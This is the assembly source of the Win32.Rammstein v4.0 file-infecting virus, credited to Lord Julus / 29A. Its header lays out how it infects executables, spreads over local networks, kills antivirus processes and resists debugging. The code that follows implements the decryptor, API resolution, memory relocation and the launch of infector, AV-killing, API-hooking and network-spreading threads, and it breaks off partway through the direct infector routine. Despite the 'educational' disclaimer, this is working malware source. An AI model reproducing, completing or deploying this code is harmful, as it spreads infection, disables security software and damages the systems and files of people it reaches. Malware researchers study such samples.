
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RAMM.ASM]ƒƒƒ
comment $
                         €€€€€€€€€€€€€€€€€€€€€€€€€€€
                         €€ﬂ     ﬂ€ﬂ     ﬂ€ﬂ     ﬂ€€
                         €€   €   €   €   €   €   €€
                         €€€ﬂﬂﬂ  ‹€‹      €       €€
                         €€   ﬂﬂﬂﬂ€ﬂﬂﬂﬂ   €   €   €€
                         €€       €      ‹€   €   €€
                         €€€€€€€€€€€€€€€€€€€€€€€€€€€

     ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹       ‹‹‹‹‹‹‹ ‹‹‹‹‹ ‹‹‹ ‹‹‹
     € ‹‹‹ € € ‹‹‹ € € ‹ ‹ € € ‹ ‹ € € ‹‹‹‹€ ‹€ﬂ€‹ € ‹‹‹‹€ €‹ ‹€ € ﬂ€€ €
     € ‹ ‹‹€ € ‹‹‹ € € € € € € € € € €‹‹‹‹ € €‹ ‹€ € ‹‹‹€‹ ‹€ €‹ € €‹ﬂ €
     €‹€‹‹‹€ €‹€ €‹€ €‹€ﬂ€‹€ €‹€ﬂ€‹€ €‹‹‹‹‹€  ﬂﬂﬂ  €‹‹‹‹‹€ €‹‹‹€ €‹€ﬂ€‹€

                                     v4.0

                              = Final Release =

                       (c) Lord Julus / 29A (Nov 2000)


     ===================================================================

                                DISCLAIMER

     This is the source code of a virus. Possesing, using, spreading of
     this source code, compiling and linking it, possesing, using and
     spreading of the executable form is illegal and it is forbidden.
     Should you do such a thing, the author may not be held responsible
     for any damage that occured from the use of this source code. The
     actual purpose of this source code is for educational purposes and
     as an object of study. This source code comes as is and the author
     cannot be held responsible for the existance of other modified
     variants of this code.

     ====================================================================

     History:

     09 Sep 2000 - Today I made a small improvement. When the dropper roams
                   the net onto another computer it remains in the windows
                   dir and it represents a weak point which might be noticed
                   by an av. So, now, the virus will smartly remove either
                   the dropper or the entry in the win.ini file if one of
                   them is missing. If both are there, they are left alone
                   because they will remove eachother. Added Pstores.exe to
                   the black list. Thanks to Evul for pointing me out that
                   it is a rather peculiar file and cannot be safely
                   infected.

     22 Jul 2000 - The virus has moved up to version 4.0. Today I added
                   the network infector. It comes in a separate thread.
                   For the moment looks like everything works fine. Will
                   add a timer to it so that it does not hang in huge
                   networks... Virus is above 13k now... Waiting for the
                   LZ!

     18 Jul 2000 - Fixed a bug in the section increase algorithm: if you
                   want to have a good compatibility you NEED to place the
                   viral code exactly at the end of file and NOT at the
                   end of the VirtualSize or SizeOfRawData as it appears
                   in the section header, because many files get their
                   real size calculated at load time in some way.
                   HURRAY!!! YES!! I fixed a shitty bug! If you do section
                   add you MUST check also if any directory VA follows
                   immediately the last section header so that you will
                   not overwrite it. Now almost all files work ok under
                   NT!!!! However, I don't seem to be able to make
                   outlook.exe get infected so I put it on the black list.
                   The other MsOffice executables get infected correctly
                   on both Win9x and WinNT.

     17 Jul 2000 - Have started some optimizations and proceduralizations
                   (;-)))). The virus is quickly going towards 13k so I
                   am quite anxious to implement my new LZ routine to
                   decrease it's size. I fixed a bug: WinNT NEEDS the
                   size of headers value to be aligned to file alignment.

     14 Jul 2000 - Worked heavily on the WindowsNT compatibility. In this
                   way I was able to spot 2 bugs in the infection routine,
                   one regarding RVA of the new section and one regarding
                   the situation when the imports cannot be found by the api
                   hooker. Still thinking if I should rearrange relocs also?
                   Now files are loaded under WindowsNT (NT image is correct)
                   but they cannot fully initialize. Will research some
                   more.

     03 Jun 2000 - Added an encryption layer with no key, just a rol/ror
                   routine on parity. Also added some MMX commands. Fixed
                   a few things.

     22 May 2000 - Added EPO on files that have the viral code outside the
                   code section. Basically from now on the entry point stays
                   only into the code section. The epo is not actually epo,
                   because as I started to code it I decided to make it very
                   complicated so I will include the complicated part in the
                   next release. It will be the so called LJILE32 <Lord
                   Julus' Instruction Length Engine 32>. This engine will
                   allow me to have an exact location of the opcode for each
                   instruction so we will be able to look up any call, jump
                   or conditional jump to place our code call there. So for
                   this version only a jump at the original eip.

     21 May 2000 - Fixed a bug in the api hooker... I forgot that some import
                   sections have a null pointer to names. Also added the
                   infection by last section increase for files who cannot
                   be infected otherwise. All files should be touched now.
                   Also I fixed the problem with the payload window not
                   closing after the process closed. I solved half of it
                   as some files like wordpad.exe still have this problem.

     20 May 2000 - Prizzy helped me a lot by pointing out to me that in
                   order to have the copro working ok I need to save it's
                   environment so that the data of the victim process in
                   not altered. thanx!! Also fixed the cpuid read.

     14 May 2000 - Released first beta version to be tested

     ====================================================================
     Virus Name ........... Win32.Rammstein
     Virus Version ........ 4.0
     Virus Size ........... 14002 (debug), 15176 (release)
     Virus Author ......... Lord Julus / 29A
     Release Date ......... 30 Nov 2000
     Virus type ........... PE infector
     Target OS ............ Win95, Win98, WinNT, Win2000
     Target Files ......... many PE file types:
                            EXE COM ACM CPL HDI OCX PCI
                            QTC SCR X32 CNV FMT OCM OLB WPC
     Append Method ........ The  virus will check wether there is enough room
                            for  it  inside the code section. If there is not
                            enough  room  the virus will be placed at end. If
                            there  is  it  will  be  inserted inside the code
                            section  at  a  random  offset while the original
                            code will be saved at end. The placing at the end
                            has  also  two  variants.  If the last section is
                            Resources  or Relocations the virus will insert a
                            new section before the last section and place the
                            data  there,  also rearranging the last section's
                            RVAs.  If  the  last section is another section a
                            new  section  will  be placed at end. The name of
                            the new section is a common section name which is
                            choosed  based  on  the existing names so that it
                            does  not  repeat.  If the virus is placed at the
                            end just a small EPO code is used so that the eip
                            stays inside the code section.
                            A  special situation occurs if there is no enough
                            space  to  add  a new section header, for example
                            when  the  code section starts at RVA 200 (end of
                            headers).   In  this  situation  the  virus  will
                            increase the last section in order to append.
     Infect Methods ....... -Direct  file  attacks:  the  virus  will  attack
                            specific  files  in  the windows directory, files
                            which are most used by people
                            -Directory   scan:   all  files  in  the  current
                            directory will be infected, as well as 3 files in
                            the   system  directory  and  3  in  the  windows
                            directory
                            -Api  hooking  (per-process residency): the virus
                            hooks  a  few  api calls and infects files as the
                            victim  uses  the  apis
                            -Intranet  spreading:  the virus spreads into the
                            LAN using only windows apis
     Features ............. Multiple  threads:  the  virus  launches  a  main
                            thread.  While  this thread executes, in the same
                            time,  the original thread returns to host, so no
                            slowing  down  appears.  The  main  viral  thread
                            launches  other  6  threads  and  monitors  their
                            execution.  If  one of the threads is not able to
                            finish  the  system  is  hanged  because it means
                            somebody tryied to patch some of the thread code.
                            Heavy  anti-debugging:  i tried to use almost all
                            the  anti-debug  and  anti-emulation stuff that I
                            know
                            FPU: uses fpu instructions
                            Crc32 search: uses crc32 to avoid waste of space
                            Memory  roaming:  allocates  virtual  memory  and
                            jumps in it
                            Interlaced  code:  this  means  that some threads
                            share  the  same  piece  of code and the virus is
                            careful   to  let  only  one  in  the  same  time
                            otherwise we get some of the variables distroyed.
                            Preety hard to be emulated by avs.
                            Also features semaphores, timers
                            Marks infection using the Pythagoreic numbers.
                            SEH: the virus creates 9 SEH handlers, for each
                            thread and for the main thread.
(*)  Polymorphic .......... Yes (2 engines: Modularis, LJFPE32)
(*)  Metamorphic .......... Yes (mild custom metamorphic engine)
     Encrypted ............ Yes
     Safety ............... Yes (avoids infecting many files)
     Kill AV Processes .... Yes
     Payload .............. On  14th  every  even  month the infected process
                            will  launch  a  thread  that will display random
                            windows  with  some  of  the  Rammstein's lyrics.
                            Pretty  annoying...  Probably  this  is the first
                            virus  that  actually  creates  real  windows and
                            processes  their  messages. The windows shut down
                            as the victim process closes.


     (*) Feature not included in this version.

     Debug notes: please note that this source code features many ways of
     debugging. You may turn on and off most of the virus's features by
     turning some variables to TRUE or FALSE.
     ====================================================================

        $

;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
.586p                                              ;
.model flat, stdcall                               ;
                                                   ;
extrn MessageBoxA:proc                             ;
extrn ExitProcess: proc                            ;
                                                   ;
TRUE                  =       1                    ;
FALSE                 =       0                    ;
DEBUG                 =       TRUE                 ;debug on?
ANTIEMU               =       TRUE                 ;anti-debuggin/emulation?
JUMP                  =       TRUE                 ;allocate and jump in mem?
DIRECT                =       TRUE                 ;direct action?
ANTIAV                =       TRUE                 ;anti-av feature?
APIHOOK               =       TRUE                 ;hook imported apis?
MAINTHREAD            =       TRUE                 ;launch a main thread?
PAYLOAD               =       TRUE                 ;use payload?
RANDOMIZE_ENTRY       =       TRUE                 ;randomize code sec entry?
EPO                   =       TRUE                 ;Use EPO
MMX                   =       FALSE                ;
NETWORKINFECTION      =       TRUE                 ;
VIRUSNOTIFYENTRY      =       FALSE                ;msgbox at virus start?
VIRUSNOTIFYEXIT       =       FALSE                ;msgbox at virus end?
VIRUSNOTIFYHOOK       =       FALSE                ;
MAINTHREADSEH         =       TRUE                 ;
THREAD1SEH            =       TRUE                 ;
THREAD2SEH            =       TRUE                 ;
THREAD3SEH            =       TRUE                 ;
THREAD4SEH            =       FALSE                ;
THREAD5SEH            =       FALSE                ;
THREAD6SEH            =       TRUE                 ;
CHECKSUM              =       TRUE                 ;
WE_ARE_LAST           =       0                    ;
RELOCATIONS_LAST      =       1                    ;
RESOURCES_LAST        =       2                    ;
NOT_AVAILABLE         =       0                    ;
AVAILABLE             =       1                    ;
METHOD_MOVE_CODE      =       0                    ;
METHOD_APPEND_AT_END  =       1                    ;
METHOD_INCREASE_LAST  =       2                    ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
                                                   ;
IF MMX                                             ;
include mmx.inc                                    ; MMX !
ENDIF                                              ;
                                                   ;
@endsz macro                                       ;locate end of asciiz
       local nextchar                              ;string
                                                   ;
nextchar:                                          ;
       lodsb                                       ;
       test al, al                                 ;
       jnz nextchar                                ;
       endm                                        ;
                                                   ;
include w32nt_lj.inc                               ;
include w32us_lj.inc                               ;
                                                   ;
; Credits to jp, vecna, prizzy                     ;calculate crc32
mCRC32        equ     0C1A7F39Ah                   ;
mCRC32_init   equ     09C3B248Eh                   ;
crc32   macro   string                             ;
            crcReg = mCRC32_init                   ;
            irpc    _x,<string>                    ;
                ctrlByte = '&_x&' xor (crcReg and 0FFh)
                crcReg = crcReg shr 8              ;
                rept 8                             ;
                    ctrlByte = (ctrlByte shr 1) xor (mCRC32 * (ctrlByte and 1))
                endm                               ;
                crcReg = crcReg xor ctrlByte       ;
            endm                                   ;
            dd  crcReg                             ;
endm                                               ;
                                                   ;
noter macro string                                 ;this NOTs a string
      irpc _x,<string>                             ;
      notbyte = not('&_x&')                        ;
      db notbyte                                   ;
      endm                                         ;
      db not(0)                                    ;
endm                                               ;
                                                   ;
PUSH_POP STRUCT                                    ;
         pop_edi dd ?                              ;helps us to pop stuff...
         pop_esi dd ?                              ;
         pop_ebp dd ?                              ;
         pop_esp dd ?                              ;
         pop_ebx dd ?                              ;
         pop_edx dd ?                              ;
         pop_ecx dd ?                              ;
         pop_eax dd ?                              ;
PUSH_POP ENDS                                      ;
                                                   ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
                                                   ;
.data                                              ;
db 0                                               ;
                                                   ;
.code                                              ;
                                                   ;
start:                                             ;
       IF DEBUG                                    ;
       jmp xxx                                     ;
debug_start db 'Here is the start of the virus.',0 ;Really!! ;-)
xxx:                                               ;
       ENDIF                                       ;
       pushad                                      ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       call getdelta                               ; Get the delta handle
                                                   ;
getdelta:                                          ;
       pop ebp                                     ;
       sub ebp, offset getdelta                    ;
       or ebp, ebp                                 ;check if first gen
       jnz no_first                                ;
       mov [ebp+firstgen], 1                       ;mark the first generation
       jmp get_base                                ;
                                                   ;
no_first:                                          ;
       mov [ebp+firstgen], 0                       ;
                                                   ;
get_base:                                          ;
       call getimagebase                           ; And the imagebase...
                                                   ;
getimagebase:                                      ;
       pop eax                                     ;
                                                   ;
ourpoint:                                          ;
       sub eax, 1000h+(ourpoint-start)-1           ;before this eax equals
                                                   ;imagebase+RVA(ourpoint)+
                                                   ;RVA(code section)
                                                   ;
       mov dword ptr [ebp+imagebase], eax          ;
       mov dword ptr [ebp+ourimagebase], eax       ;
       jmp over_data                               ;
                                                   ;
imagebase    dd 00400000h                          ;
ourimagebase dd 0                                  ;
firstgen     dd 0                                  ;
                                                   ;
over_data:                                         ;
       cmp [ebp+firstgen], 1                       ;
       je EncryptedArea                            ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       call DecryptOffset                          ;very light internal
                                                   ;decrypt module
DecryptOffset:                                     ;no key, just ror/rol
       pop esi                                     ;
       add esi, (EncryptedArea - DecryptOffset)    ;
       mov edi, esi                                ;
       mov ecx, (end2-EncryptedArea)               ;
                                                   ;
DecryptLoop:                                       ;
       lodsb                                       ;
       mov ebx, ecx                                ;
       inc bl                                      ;
       jp parity                                   ;
       ror al, cl                                  ;
       jmp do_decrypt                              ;
                                                   ;
parity:                                            ;
       rol al, cl                                  ;
                                                   ;
do_decrypt:                                        ;
       stosb                                       ;
       loop DecryptLoop                            ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
EncryptedArea:                                     ;
       mov [ebp+delta], ebp                        ;save additional deltas
       IF ANTIEMU                                  ;
       mov [ebp+delta2], ebp                       ;
       ENDIF                                       ;
       mov eax, [ebp+imagebase]                    ;
       mov dword ptr [ebp+adjust], eax             ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       lea eax, [ebp+ExceptionExit]                ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       mov [ebp+copying], 0                        ;reset our syncronization
       mov [ebp+in_list], 0                        ;variables
       mov [ebp+free_routine], AVAILABLE           ;
       mov [ebp+crt_dir_flag], 3                   ;
       mov [ebp+apihookfinish], 0                  ;
                                                   ;
       lea esi, [ebp+module_names]                 ;decrypt module names
       mov ecx, module_names_length                ;
       call not_list                               ;
                                                   ;
       mov eax, [esp+28h]                          ;first let's locate the
       lea edx, [ebp+kernel32_name]                ;kernel32 base address
       call LocateKernel32                         ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+k32], eax                ;
       lea esi, dword ptr [ebp+kernel32apis]       ;
       lea edx, dword ptr [ebp+kernel32addr]       ;
       mov ecx, kernel32func                       ;
       call LocateApis                             ;and kernel32 apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+advapi32_name]      ;locate advapi32
       call LocateModuleBase                       ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+a32], eax                ;
       lea esi, dword ptr [ebp+advapi32apis]       ;
       lea edx, dword ptr [ebp+advapi32addr]       ;
       mov ecx, advapi32func                       ;
       call LocateApis                             ;and the apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+user32_name]        ;locate user32
       call LocateModuleBase                       ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+u32], eax                ;
       lea esi, dword ptr [ebp+user32apis]         ;
       lea edx, dword ptr [ebp+user32addr]         ;
       mov ecx, user32func                         ;
       call LocateApis                             ;and it's apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+gdi32_name]         ;locate gdi32
       call LocateModuleBase                       ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+g32], eax                ;
       lea esi, dword ptr [ebp+gdi32apis]          ;
       lea edx, dword ptr [ebp+gdi32addr]          ;
       mov ecx, gdi32func                          ;
       call LocateApis                             ;and it's apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+mpr32_name]         ;locate mpr32
       call LocateModuleBase                       ;
       jc NoNetworkApis                            ;
       mov dword ptr [ebp+m32], eax                ;
       lea esi, dword ptr [ebp+mpr32apis]          ;
       lea edx, dword ptr [ebp+mpr32addr]          ;
       mov ecx, mpr32func                          ;
       call LocateApis                             ;and it's apis
       jc NoNetworkApis                            ;
                                                   ;
       mov [ebp+netapis], TRUE                     ;
       jmp get_img                                 ;
                                                   ;
NoNetworkApis:                                     ;
       mov [ebp+netapis], FALSE                    ;
                                                   ;
get_img:                                           ;
       lea edi, dword ptr [ebp+img32_name]         ;locate and save
       call LocateModuleBase                       ;the checksum procedure
       jc no_image                                 ;
       call @checksum                              ;
       db "CheckSumMappedFile", 0                  ;
@checksum:                                         ;
       push eax                                    ;
       call [ebp+_GetProcAddress]                  ;
       mov [ebp+checksumfile], eax                 ;
                                                   ;
no_image:                                          ;
       lea esi, [ebp+module_names]                 ;recrypt names
       mov ecx, module_names_length                ;
       call not_list                               ;
                                                   ;
       IF VIRUSNOTIFYENTRY                         ;
       push 0                                      ;
       call entrytext1                             ;
       db 'Rammstein viral code start!', 0         ;
entrytext1:                                        ;
       call entrytext2                             ;
       db 'Rammstein viral code start!', 0         ;
entrytext2:                                        ;
       push 0                                      ;
       call [ebp+_MessageBoxA]                     ;
       ENDIF                                       ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       call smash_dropper                          ;kill dropper
       call getversion                             ;get the windoze version
                                                   ;
WindowsVersion OSVERSIONINFOA <SIZE OSVERSIONINFOA>;
                                                   ;
getversion:                                        ;
       call [ebp+_GetVersionExA]                   ;
       mov byte ptr [ebp+version], al              ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       mov [ebp+skipper], 0                        ;
       IF MMX                                      ;
       pushfd                                      ;push flags
       pop eax                                     ;get flags
       bt eax, 21h                                 ;test for mmx presence
       jnc no_mmx_present                          ;
       mov [ebp+mmx], TRUE                         ;set it!
       jmp done_mmx                                ;
                                                   ;
no_mmx_present:                                    ;
       mov [ebp+mmx], FALSE                        ;
                                                   ;
done_mmx:                                          ;
       ENDIF                                       ;
       IF JUMP                                     ;allocate some more
                                                   ;
       cmp [ebp+method], METHOD_MOVE_CODE          ;if code is not moved
       jne restore_epo                             ;skip memory jump
                                                   ;
       call [ebp+_VirtualAlloc], 0, virussize+1000h, MEM_COMMIT+MEM_RESERVE,\
                                 PAGE_EXECUTE_READWRITE
       or eax, eax                                 ;memory
       jnz no_memory_error                         ;
                                                   ;
       call fatalexit                              ;we cannot continue...
       db "Not enough memory!", 0                  ;
                                                   ;
fatalexit:                                         ;if an error occurs, then
       push 0                                      ;simulate a fatal exit
       call [ebp+_FatalAppExitA]                   ;
                                                   ;
no_memory_error:                                   ;
       mov [ebp+memory], eax                       ;otherwise copy the
       lea esi, [ebp+start]                        ;virus to memory and
       mov edi, eax                                ;
       mov ecx, virussize                          ;
       rep movsb                                   ;
       add eax, offset resident_area - offset start;
       push eax                                    ;
       ret                                         ;continue there...
                                                   ;
restore_epo:                                       ;
       IF EPO                                      ;
       mov edi, [ebp+addressofentrypoint]          ;restore epo
       add edi, [ebp+imagebase]                    ;
       lea esi, [ebp+saved_code]                   ;
       lodsd                                       ;
       stosd                                       ;
       lodsd                                       ;
       stosd                                       ;
       ENDIF                                       ;
                                                   ;
resident_area:                                     ;
       call getdelta2                              ;get delta again...
                                                   ;
getdelta2:                                         ;
       pop ebp                                     ;
       sub ebp, offset getdelta2                   ;
       mov [ebp+delta], ebp                        ;
       IF ANTIEMU                                  ;
       mov [ebp+delta2], ebp                       ;
       ENDIF                                       ;
                                                   ;
       cmp [ebp+firstgen], 1                       ;
       je grunge                                   ;
                                                   ;
       cmp [ebp+method], METHOD_MOVE_CODE          ;check the method
       jne second_method                           ;
                                                   ;
       mov esi, [ebp+codesource]                   ;if here, we must move
       mov edi, [ebp+codedestin]                   ;some code back to where
       add esi, [ebp+imagebase]                    ;it belongs...
       add edi, [ebp+imagebase]                    ;
       mov ecx, virussize                          ;
       rep movsb                                   ;
                                                   ;
second_method:                                     ;
                                                   ;
grunge:                                            ;
       ENDIF                                       ;
       IF MAINTHREAD                               ;now we launch the main
       lea ebx, [ebp+mainthreadid]                 ;thread
       lea eax, [ebp+MainThread]                   ;
       call [ebp+_CreateThread], 0, 0, eax, ebp, 0, ebx;
       cmp [ebp+firstgen], 1                       ;if it is the first gen
       jne do_return                               ;than wait for it to
       call [ebp+_WaitForSingleObject], eax, INFINITE ;finish
                                                   ;
do_return:                                         ;otherwise, return to host
       jmp ReturnToHost                            ;here...
       ENDIF                                       ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
MainThread proc                                    ;
       call @MainThreadDelta                       ;for our main thread get
@MainThreadDelta:                                  ;the delta handle again
       pop ebp                                     ;
       sub ebp, offset @MainThreadDelta            ;
                                                   ;
       IF MAINTHREADSEH                            ;
       lea eax, [ebp+MainExceptionExit]            ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
                                                   ;
no_main_seh:                                       ;
       ENDIF                                       ;
       lea edx, [ebp+OurThreads]                   ;Prepare to create the
       lea ebx, [ebp+OurThreadIds]                 ;threads...
       lea edi, [ebp+OurThreadHandles]             ;
       mov ecx, 6                                  ;
                                                   ;
create_loop:                                       ;
       mov eax, [edx]                              ;
       add eax, ebp                                ;
       call StartThread                            ;start them and set
       add edx, 4                                  ;them
       add ebx, 4                                  ;
       add edi, 4                                  ;
       loop create_loop                            ;
                                                   ;
       cmp [ebp+no_imports], TRUE                  ;
       jne no_per_process_skip                     ;
       mov [ebp+skipper], 1                        ;
                                                   ;
no_per_process_skip:                               ;
       lea eax, [ebp+offset Semaphore]             ;now prepare a semaphore
       push eax                                    ;to monitor their
       push 31                                     ;execution
       push 0                                      ;
       push 0                                      ;
       call [ebp+_CreateSemaphoreA]                ;
       mov [ebp+hsemaphore], eax                   ;
                                                   ;
       lea edi, [ebp+OurThreadHandles]             ;and now start them...
       mov ecx, 6                                  ;
                                                   ;
resume_loop:                                       ;
       push ecx                                    ;
       push dword ptr [edi]                        ;
       call [ebp+_ResumeThread]                    ;resume!
       add edi, 4                                  ;
       pop ecx                                     ;
       loop resume_loop                            ;
                                                   ;
       push FALSE                                  ;Wait forever until all
       push INFINITE                               ;threads finish...
       push TRUE                                   ;(if the mainthread is
       lea eax, [ebp+offset OurThreadHandles]      ;TRUE, by this time the
       push eax                                    ;host is already running
       push 6                                      ;in parallel with this
       call [ebp+_WaitForMultipleObjectsEx]        ;thread)
                                                   ;
       lea eax, [ebp+test_semaphore]               ;now get the last count
       push eax                                    ;of the semaphore...
       push 1                                      ;Should be 6*5...
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
                                                   ;
       push [ebp+hsemaphore]                       ;close semaphore
       call [ebp+_CloseHandle]                     ;
                                                   ;
       mov eax, [ebp+test_semaphore]               ;now get the value
       mov ebx, offset where_to - offset jump      ;calculate jump offset
       sub ebx, 30                                 ;5*6
       add eax, ebx                                ;and make a jump with it
       add eax, offset jump                        ;If the value is smaller
       add eax, ebp                                ;
jump:  jmp eax                                     ;then it should
       jmp jump                                    ;mean someone fucked with
       jmp jump                                    ;our threads and probably
       jmp jump                                    ;the execution falls here
       jmp jump                                    ;where it hangs... This
       jmp jump                                    ;will give the user the
       jmp jump                                    ;impression that he played
       jmp jump                                    ;with hot stuff...
                                                   ;
where_to:                                          ;
       IF MAINTHREAD                               ;if we have a mainthread
       db 0E9h                                     ;we must kill it...
       dd offset KillThread - $-4                  ;
       ELSE                                        ;
       db 0E9h                                     ;otherwise, simply return
       dd offset ReturnToHost - $-4                ;to host...
       ENDIF                                       ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
StartThread:                                       ;
       pusha                                       ;here we create threads
       call [ebp+_CreateThread], 0, 0, eax, ebp, CREATE_SUSPENDED, ebx
       mov [edi], eax                              ;
       push THREAD_PRIORITY_HIGHEST                ;and set their priority
       push dword ptr [ebx]                        ;
       call [ebp+_SetThreadPriority]               ;
       popa                                        ;
       db 0c3h                                     ;ret
       ret                                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
OurThreadIds:                                      ;
Thread_1_id dd 0                                   ;Direct infector
Thread_2_id dd 0                                   ;Directory infector
Thread_3_id dd 0                                   ;AV killed
Thread_4_id dd 0                                   ;Anti-debugging
Thread_5_id dd 0                                   ;Api hooker
Thread_6_id dd 0                                   ;Network infector
                                                   ;
OurThreadHandles:                                  ;
Thread_1_handle dd 0                               ;
Thread_2_handle dd 0                               ;
Thread_3_handle dd 0                               ;
Thread_4_handle dd 0                               ;
Thread_5_handle dd 0                               ;
Thread_6_handle dd 0                               ;
hsemaphore      dd 0                               ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the direct infector thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_1_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread1Delta                          ;I have been experiencing
@Thread1Delta:                                     ;problems with delta pass
       pop ebp                                     ;via the parameter so I
       sub ebp, offset @Thread1Delta               ;decided to read it again
                                                   ;
       IF THREAD1SEH                               ;
       lea eax, [ebp+Thread1Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       IF DIRECT                                   ;
       lea esi, [ebp+offset direct_list]           ;point file names in the
       mov ecx, direct_list_len                    ;Windows directory and
       call not_list                               ;restore names...
                                                   ;
       push 260d                                   ;
       call windir                                 ;get the Windows dir.
name_  db 260d dup (0)                             ;
                                                   ;
windir:                                            ;
       call [ebp+_GetWindowsDirectoryA]            ;
       lea edi, [ebp+name_]                        ;point the dir path
       xchg eax, edx                               ;
       lea esi, [ebp+direct_list]                  ;point names
       inc esi                                     ;
       inc esi                                     ;
                                                   ;
direct_loop:                                       ;
       mov word ptr [edi+edx], 005Ch               ;mark terminator slash
       cmp byte ptr [esi], 0FFh                    ;was last name?
       je direct_end                               ;
       call [ebp+_lstrcat], edi, esi               ;concatenate stringz
       lea eax, [ebp+W32FD]                        ;pointer to find data
